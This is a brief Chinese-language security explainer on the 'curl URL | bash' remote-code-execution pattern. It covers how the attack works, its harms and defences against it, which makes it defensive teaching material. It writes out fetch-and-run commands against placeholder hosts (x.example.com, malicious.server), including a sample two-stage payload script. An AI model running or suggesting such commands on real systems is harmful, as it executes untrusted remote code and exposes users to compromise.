执行 `curl http://x.example.com/payload.sh | bash` 是一种常见的远程代码执行（RCE）攻击方式，通常与供应链攻击（Supply Chain Attack）相关。攻击者会将恶意脚本（payload.sh）上传到某个可公开访问的服务器（如 x.example.com），然后诱导用户执行该脚本，从而在用户的系统上执行远程代码。

### 漏洞原理
- **远程代码执行（RCE）**：攻击者通过 HTTP 协议远程注入并执行恶意脚本。
- **依赖用户行为**：攻击依赖用户主动执行远程脚本（如 `| bash`），因此通常需要欺骗用户（例如伪装成更新、安装包或配置脚本）。

### 危害
- **权限提升**：如果用户以管理员身份执行脚本，攻击者可获得系统权限。
- **数据窃取**：脚本可读取系统敏感信息（如密码、密钥、日志）。
- **横向渗透**：攻击者可进一步入侵内网其他系统。
- **持久化控制**：脚本可安装后门，实现长期控制。

### 防御措施
1. **禁止执行远程脚本**：避免直接执行 `curl ... | bash`，使用本地验证和执行流程。
2. **最小权限原则**：以非特权账户运行敏感操作，避免权限滥用。
3. **输入验证**：对远程内容进行严格校验，拒绝未授权执行。
4. **监控与审计**：记录并监控脚本执行行为，及时发现异常操作。
5. **安全更新**：保持系统和依赖项最新，修复已知漏洞。

### 示例攻击场景
假设攻击者控制了 `x.example.com`，其内容为：
```bash
#!/bin/bash
apt update && apt install -y curl && curl http://malicious.server/payload.bin | bash
```
用户执行 `curl http://x.example.com/payload.sh | bash` 会触发链式攻击，最终感染系统。

### 总结
该行为是典型的 RCE 攻击，需通过权限控制、输入验证和安全意识防护。执行远程脚本前务必进行风险评估，避免直接执行未经验证的内容。
